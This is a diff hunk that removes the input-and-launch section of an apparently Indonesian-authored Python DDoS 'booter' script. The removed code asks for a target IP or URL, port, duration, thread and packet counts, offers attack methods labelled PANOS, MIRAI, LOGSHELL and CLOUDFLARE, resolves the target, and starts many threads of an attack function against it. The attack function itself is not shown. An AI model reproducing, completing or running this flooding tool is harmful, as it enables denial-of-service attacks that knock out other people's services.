@@ -112,37 +112,3 @@ banner = f"""
 {Fore.RED}┣{Fore.YELLOW}                       BY: KF'24
 {Fore.RED}┣{Fore.BLUE}                          —oO0Oo—
 {Fore.RED} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{Fore.LIGHTYELLOW_EX}SC INI MEMVUTUHKAN 35 DETIK UTK MELAKUKAN SERANGAN{Fore.RESET}"""
-
-
-print(banner)
-host = ""
-ip = ""
-print(f"{Fore.LIGHTWHITE_EX}PYF OWN1-5")
-data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET (DEFAULT=PYF EXAMPLE=OWN1)>").upper()
-target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
-port_loader = int(input(f"{Fore.YELLOW}PORT>"))
-time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=250)>"))
-spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 EXAMPLE=299)>"))
-create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)>"))
-booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500 EXAMPLE=65536)>"))
-print(f"{Fore.LIGHTCYAN_EX}       EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
-print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
-methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>").upper()
-spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}SPAM CREATE THREAD (DEFAULT=5 EXAMPLE=15)>"))
-print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
-try:
-    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
-    ip = socket.gethostbyname(host)
-except socket.gaierror:
-    exit()
-for loader_num in range(create_thread):
-    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
-    sys.stdout.flush()
-    
-    for _ in range(spam_create_thread):
-        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
-clear_text()
-print(banner)
-status_code = True
-print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
